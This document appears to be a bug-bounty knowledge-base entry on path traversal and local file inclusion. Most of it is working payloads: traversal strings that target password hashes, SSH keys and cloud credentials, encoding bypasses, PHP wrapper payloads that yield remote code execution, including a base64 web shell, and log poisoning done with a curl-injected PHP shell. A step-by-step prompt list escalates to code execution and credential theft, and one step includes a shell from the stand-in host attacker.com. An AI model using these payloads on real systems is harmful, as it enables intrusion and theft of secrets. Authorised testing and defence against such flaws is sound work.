---
id: "path-traversal"
title: "Path Traversal & Local File Inclusion (LFI)"
type: "technique"
category: "web-application"
subcategory: "lfi"
tags: ["path-traversal", "lfi", "directory-traversal", "file-inclusion", "rfi", "log-poisoning", "php-wrappers"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xxe", "command-injection-payloads", "file-upload"]
updated: "2026-03-30"
---

## Overview

Path traversal (directory traversal) allows reading files outside the intended directory by manipulating file path parameters. LFI (Local File Inclusion) executes local files as code. RFI (Remote File Inclusion) includes remote files. @nahamsec called path traversal a "serious comeback" vulnerability — many hunters overlook it. Payout: $2k-$10k+.

## Basic Traversal Payloads

```
# Linux
../../../etc/passwd
../../../etc/shadow
../../../home/user/.ssh/id_rsa
../../../proc/self/environ
../../../proc/self/cmdline
../../../var/log/apache2/access.log

# Windows
..\..\..\windows\win.ini
..\..\..\windows\system32\config\sam
..\..\..\inetpub\wwwroot\web.config
..\..\..\users\administrator\desktop\proof.txt

# Application files
../../../app/.env
../../../app/config/database.yml
../../../var/www/html/wp-config.php
```

## Filter Bypass Techniques

```
# URL encoding
%2e%2e%2f  →  ../
%2e%2e/    →  ../
..%2f      →  ../
%2e%2e%5c  →  ..\

# Double URL encoding
%252e%252e%252f  →  ../

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# UTF-8 encoding
..%c0%af  →  ../
..%c1%9c  →  ..\

# Double traversal (if ../ is stripped once)
....//....//....//etc/passwd
..././..././..././etc/passwd

# Absolute path (bypass prefix check)
/etc/passwd

# Using backslash (Windows/mixed environments)
..\..\..\etc\passwd
..\/..\/..\/etc/passwd
```

## PHP Wrappers for LFI

```php
# Read source code (base64)
php://filter/convert.base64-encode/resource=index.php

# Read source code (rot13)
php://filter/read=string.rot13/resource=config.php

# RCE via php://input
POST /page.php?file=php://input
Body: <?php system('id'); ?>

# RCE via data://
/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==

# RCE via expect:// (if enabled)
/page.php?file=expect://id

# Zip wrapper
/page.php?file=zip:///tmp/uploads/evil.zip%23shell.php

# Phar wrapper
/page.php?file=phar:///tmp/uploads/evil.phar
```

## LFI to RCE Techniques

### Log Poisoning
```bash
# 1. Inject PHP into Apache/Nginx access log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Include the log file via LFI
/page.php?file=../../../var/log/apache2/access.log&cmd=id

# Common log paths
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log          # SSH bruteforce username injection
/var/log/mail.log          # SMTP command injection
/proc/self/environ         # HTTP headers in environment
/proc/self/fd/N            # File descriptors
```

### /proc/self/environ
```
# If User-Agent or other headers appear in /proc/self/environ
# Inject PHP in the header and include /proc/self/environ
```

### Session Files
```bash
# PHP stores session data in files
# 1. Set a PHP value in your session (e.g., via a form field)
# 2. Include the session file
/page.php?file=../../../tmp/sess_PHPSESSID
/page.php?file=../../../var/lib/php/sessions/sess_PHPSESSID
```

## High-Value Files to Read

### Linux
```
/etc/passwd                    # User list
/etc/shadow                    # Password hashes
/etc/hostname                  # Hostname
/proc/self/environ             # Environment variables (secrets)
/proc/self/cmdline             # Running process command
/home/*/.ssh/id_rsa            # SSH private keys
/home/*/.bash_history          # Command history
/root/.ssh/id_rsa              # Root SSH key
```

### Application
```
.env                           # Environment variables
config/database.yml            # Database credentials
wp-config.php                  # WordPress config
web.config                     # IIS/.NET config
application.properties         # Spring Boot config
settings.py                    # Django config
.git/config                    # Git remote URLs
.git/HEAD                      # Current branch
docker-compose.yml             # Docker config with secrets
```

### Cloud
```
/proc/self/environ             # AWS keys in env vars
/var/run/secrets/kubernetes.io/serviceaccount/token  # K8s token
~/.aws/credentials             # AWS credentials
~/.config/gcloud/credentials.db  # GCP credentials
```

## Deep Dig Prompts

```
Given this file parameter [describe]:
1. Test basic traversal with increasing depth (../ x 1 through 10).
2. Apply every encoding bypass (URL, double URL, UTF-8, null byte).
3. Try PHP wrappers if the target is PHP (filter, input, data, expect).
4. If LFI confirmed, escalate to RCE via log poisoning, session files, or /proc/self/environ.
5. Target high-value files: .env, SSH keys, cloud credentials, database configs.
6. Test for RFI by including http://attacker.com/shell.txt.
```

## Tools

- **ffuf** — Fuzz file parameters with LFI wordlists
- **dotdotpwn** — Automated directory traversal fuzzer
- **Burp Suite** — Manual path manipulation
- **SecLists** — LFI wordlists (Fuzzing/LFI/LFI-Jhaddix.txt)
